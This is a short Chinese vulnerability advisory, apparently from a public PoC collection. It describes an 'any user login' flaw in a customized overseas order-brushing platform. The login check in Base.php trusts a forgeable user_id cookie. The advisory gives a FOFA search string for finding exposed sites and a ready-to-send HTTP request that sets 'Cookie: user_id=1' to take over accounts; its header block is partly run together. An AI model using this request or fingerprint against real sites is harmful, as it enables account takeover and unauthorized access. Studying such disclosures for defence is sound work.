# 某二开版海外抢单Shua单系统存在任意用户登录漏洞

# 一、漏洞简介
位于 /index/controller/Base.php 控制器的 __construct 方法作为验证登录控制器，来验证用户是否登录，然而这套系统实际采用两套验证用户的方法，Session和Cookie并存，其中 if (!$uid) { $uid = cookie('user_id'); } 这句话是关键，如果Session中没有发现user_id，那么直接验证Cookie中的user_id，而Cookie是可以伪造的，这里导致漏洞产生。

# 二、影响版本
+ 海外刷单系统

# 三、资产测绘
+ fofa`"/red/popper.min.js"`
+ 特征


# 四、漏洞复现
```plain
GET /index/index HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Length: 73
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: user_id=1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
User-Token-Csrf: csrf66e28d7ebbffaX-Requested-With: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ixpcs4iq19u5yrp4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
